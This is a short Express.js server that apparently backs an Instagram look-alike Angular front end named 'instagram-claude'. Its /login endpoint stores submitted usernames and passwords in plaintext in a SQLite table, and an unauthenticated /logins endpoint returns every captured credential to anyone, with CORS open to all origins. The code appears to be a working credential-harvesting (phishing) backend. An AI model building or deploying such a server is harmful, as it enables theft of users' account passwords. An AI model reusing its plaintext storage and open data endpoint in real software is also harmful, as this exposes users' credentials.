const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(cors({ origin: '*' })); // Allow all origins for now

// Serve Angular static files
app.use(express.static(path.join(__dirname, '../dist/instagram-claude')));

// Define dbPath and create data directory if it doesn’t exist
const dbPath = path.join(__dirname, 'data', 'login_data.db');
if (!fs.existsSync(path.join(__dirname, 'data'))) {
  fs.mkdirSync(path.join(__dirname, 'data'));
}

// Connect to SQLite database
const db = new sqlite3.Database(dbPath, (err) => {
  if (err) {
    console.error('Error opening database:', err);
  } else {
    console.log('Connected to SQLite database');
  }
});

// Create logins table if it doesn’t exist
db.run(`
  CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL
  )
`);

// Endpoint to store login data
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ status: 'error', message: 'Username and password are required' });
  }

  db.run('INSERT INTO logins (username, password) VALUES (?, ?)', [username, password], (err) => {
    if (err) {
      console.error('Error inserting data:', err);
      return res.status(500).json({ status: 'error', message: 'Server error' });
    }
    res.json({ status: 'success', message: 'Login data saved!' });
  });
});

// Endpoint to fetch all login data
app.get('/logins', (req, res) => {
  db.all('SELECT * FROM logins', [], (err, rows) => {
    if (err) {
      console.error('Error fetching data:', err);
      return res.status(500).json({ status: 'error', message: 'Server error' });
    }
    res.json(rows);
  });
});

// Catch-all route to serve Angular app
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../dist/instagram-claude/index.html'));
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});